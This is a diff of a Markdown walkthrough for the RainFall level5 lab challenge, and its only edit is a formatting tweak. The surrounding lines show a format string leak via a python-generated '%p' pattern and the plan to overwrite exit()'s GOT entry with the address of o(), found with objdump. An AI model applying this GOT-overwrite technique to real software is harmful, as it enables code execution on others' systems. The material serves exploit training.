@@ -98,7 +98,7 @@ level5@RainFall:~$ python -c 'print "AAAA" + " %p" * 5' > /tmp/pattern5
 level5@RainFall:~$ cat /tmp/pattern5 - | ./level5
 AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520
 ```
-We found that the string <code>AAAA</code> resides in the fourth position of the buffer. Our next task is to locate the address of the <code>exit()</code> function, as we intend to overwrite this address with the address of our function <code>o()</code> (<code>0x080484a4</code>). To accomplish this, we need to inspect the dynamic relocation entries, which include the addresses stored in the <code>Global Offset Table (GOT)</code>:
+We found that the string <code>AAAA</code> resides in the fourth position of the buffer. Our next task is to locate the address of the <code>exit()</code> function, as we intend to overwrite this address with the address of our function <code>o()</code> (<code>0x080484a4</code>). To accomplish this, we need to inspect the dynamic relocation entries, which include the addresses stored in the Global Offset Table (<code>GOT</code>):
 ``` shell
 level5@RainFall:~$ objdump -R level5 | grep exit
 08049828 R_386_JUMP_SLOT   _exit
